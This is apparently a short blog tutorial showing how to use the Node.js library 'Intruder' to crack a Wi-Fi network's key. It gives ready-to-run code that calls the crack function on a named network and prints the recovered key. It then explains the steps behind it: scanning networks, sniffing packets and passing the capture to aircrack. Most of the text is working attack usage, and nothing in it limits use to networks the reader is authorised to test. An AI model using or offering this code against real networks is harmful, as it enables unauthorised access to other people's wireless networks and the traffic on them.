

# Intruder: How to crack Wi-Fi networks in Node.js

I'm going to explain how to use [Intruder](https://github.com/stevenmiller888/intruder) to crack a Wi-Fi network in Node.js. Then, I'm going to explain how it works at a high-level.

Start by finding the name of the network you want to crack. In this case, we'll use an arbitrary network named "Home". Then, you'll want to `require` Intruder, initialize it, and call the `crack` function:

```
var Intruder = require('intruder');

var intruder = Intruder();

intruder.crack('Home', function(err, key) {
  if (err) throw new Error(err);
  console.log(key);
});
```

That's it. Sort of. It turns out it might take some time for Intruder to crack the network. So maybe you want to monitor it's progress? Here's how to do that:

```
var Intruder = require('intruder');

Intruder()
  .on('attempt', function(ivs) {
    console.log(ivs);
  })
  .crack('Home', function(err, key) {
    if (err) throw new Error(err);
    console.log(key);
  });
```

Now, I'll explain how it works:

1. When you call `intruder.crack`, first we look up all the wireless networks in range. Then, we filter them out to find the network that you passed in.

2. After finding the specific network, we start sniffing network packets on the network channel.

3. Sniffing packets will generate a `capture` file that contains information about the captured packets. We find that file and then pass the file into [aircrack](https://github.com/aircrack-ng/aircrack-ng), which will attempt to decrypt it. You usually need at least 80,000 IVs, according to aircrack's documentation.

If you have any questions or comments, don't hesitate to find me on [twitter](https://www.twitter.com/stevenmiller888).
